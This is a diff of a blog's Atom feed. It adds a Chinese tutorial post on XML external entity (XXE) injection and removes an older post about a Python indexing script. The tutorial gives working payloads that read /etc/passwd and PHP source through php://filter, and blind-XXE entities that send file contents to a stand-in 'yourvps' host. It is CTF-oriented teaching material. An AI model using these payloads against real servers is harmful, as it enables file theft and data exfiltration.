@@ -106,6 +106,76 @@
   </entry>
   
   <entry>
+    <title>小试XML实体注入攻击</title>
+    <link href="http://yoursite.com/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
+    <id>http://yoursite.com/2017/07/04/小试XML实体注入攻击/</id>
+    <published>2017-07-04T03:12:56.000Z</published>
+    <updated>2017-07-04T09:28:13.557Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。</p>
+<h2 id="XML基本知识"><a href="#XML基本知识" class="headerlink" title="XML基本知识"></a>XML基本知识</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>chybeta<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ph0en1x<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在上面代码中的第一行，定义XML的版本与编码。</p>
+<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
+<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
+<h3 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h3><p>XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</p>
+<h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</p>
+<p>其基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素名 [  元素描述   ]&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="内部引入"><a href="#内部引入" class="headerlink" title="内部引入"></a>内部引入</h3><p>格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></div></pre></td></tr></table></figure></p>
+<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  chybeta  "Hello World!"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;chybeta;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问该XML文档，<code>&amp;chybeta;</code>会被解析为Hello World!并输出。</p>
+<h3 id="外部引入"><a href="#外部引入" class="headerlink" title="外部引入"></a>外部引入</h3><p>基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></div></pre></td></tr></table></figure></p>
+<p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。<br>由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="xxe注入"><a href="#xxe注入" class="headerlink" title="xxe注入"></a>xxe注入</h2><p>以php环境为例，index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">  print_r((string)$xml);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p><img src="https://thief.one/upload_image/20170620/1.png" alt=""></p>
+<p>利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://TEST.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true" alt=""></p>
+<p>我这里测试时，如果不进行url编码则不能成功解析。</p>
+<p>若使用fill协议，在unix环境下，可以用如下xml来读取passwd：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>如果要读取php文件，因为php、html等文件中有各种括号<code>&lt;</code>，<code>&gt;</code>，若直接用file读取会导致解析错误，此时可以利用<code>php://filter</code>将内容转换为base64后再读取。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这里同样先经过url编码后再传入。读取结果如下:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true" alt=""></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。</p>
+<h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h3><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
+<h2 id="bind-xxe"><a href="#bind-xxe" class="headerlink" title="bind xxe"></a>bind xxe</h2><p>以php环境为例，现在更改index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。</p>
+<h3 id="读取本地文件-1"><a href="#读取本地文件-1" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在我的vps的xxe.xml的内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</div></pre></td></tr></table></figure></p>
+<p>而测试文件TEST.txt内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta</div></pre></td></tr></table></figure></p>
+<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt=""></p>
+<p>若要读取php等文件，同样需要先经过base64加密下。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>查看access.log:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true" alt=""></p>
+<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p>发送的xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data  [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>而在vps上的xxe.xml内容为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2;</div></pre></td></tr></table></figure></p>
+<p>注意的是，<code>&amp;#25;</code> 不能直接写成<code>%</code>，否则无法解析。</p>
+<p>xxe.xml中定义和引用了<code>%payload2</code>,在通过<code>%dtd</code>引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log:</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true" alt=""></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>拿jarvisoj平台上的题目来小试牛刀吧。题目：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="external">api调用</a></p>
+<p>这里写一下题目``</p>
+<h3 id="xxe相关WP"><a href="#xxe相关WP" class="headerlink" title="xxe相关WP"></a>xxe相关WP</h3><ul>
+<li><a href="http://z1ng.net/post/thoughts/alictf-2014-writeup" target="_blank" rel="external">AliCTF-Quals-2014 WebA-300</a></li>
+<li><a href="https://github.com/iAklis/epub-library-challenge" target="_blank" rel="external">HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录</a></li>
+<li><a href="https://gist.github.com/h3xstream/3d51b99f651548f7fa2b" target="_blank" rel="external">GoSecure-CTF-2015 web-300</a></li>
+</ul>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;p&gt;XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="XML注入" scheme="http://yoursite.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title>ringzer0team-web-writeup</title>
     <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-web-writeup/"/>
     <id>http://yoursite.com/2017/06/30/ringzer0team-web-writeup/</id>
@@ -1075,36 +1145,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>利用python为1000php生成目录页面</title>
-    <link href="http://yoursite.com/2017/04/03/%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2/"/>
-    <id>http://yoursite.com/2017/04/03/利用python为1000php生成目录页面/</id>
-    <published>2017-04-03T04:34:58.000Z</published>
-    <updated>2017-04-03T04:57:29.998Z</updated>
-    
-    <content type="html"><![CDATA[<p>1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。<br>github地址： <a href="https://github.com/Xyntax/1000php" target="_blank" rel="external">https://github.com/Xyntax/1000php</a><br><a id="more"></a><br>git clone下来后，案例保存在bugs文件夹里，名称都是wooyun-xxx-xxxxx格式，没有索引，从名字上看也难以知道这是什么类型的漏洞。所以这里为它生成一个目录页面。</p>
-<h1 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h1><p>漏洞的简要信息保存在页面的title标签中，如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic1.jpg" alt=""><br>使用BeautifulSoup来对wooyun-xxx-xxxxx.html进行解析，获取其title。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic2.jpg" alt=""></p>
-<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line">htmlName = os.listdir(htmlLoc)</div><div class="line">indexhtml = open(<span class="string">"index.html"</span>,<span class="string">"w"</span>)</div><div class="line"></div><div class="line">setCharset = <span class="string">'&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'</span></div><div class="line">indexhtml.write(setCharset)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> htmlName:</div><div class="line">	<span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'w'</span>:</div><div class="line">		soup = BeautifulSoup(open(i),<span class="string">"html.parser"</span>)</div><div class="line">		url =<span class="string">'&lt;a href="'</span>+i+<span class="string">'"&gt;'</span>+soup.title.string+<span class="string">'&lt;/a&gt;'</span></div><div class="line">		indexhtml.write(url)</div><div class="line">		indexhtml.write(<span class="string">"&lt;/br&gt;"</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"done!"</span></div></pre></td></tr></table></figure>
-<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>将代码保存为py文件后，放在bugs文件夹下运行，会生成index.html文件。打开。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic3.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。&lt;br&gt;github地址： &lt;a href=&quot;https://github.com/Xyntax/1000php&quot;&gt;https://github.com/Xyntax/1000php&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="python" scheme="http://yoursite.com/categories/python/"/>
-    
-    
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
-      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
-    
-      <category term="beautifulsoup" scheme="http://yoursite.com/tags/beautifulsoup/"/>
     
   </entry>
   
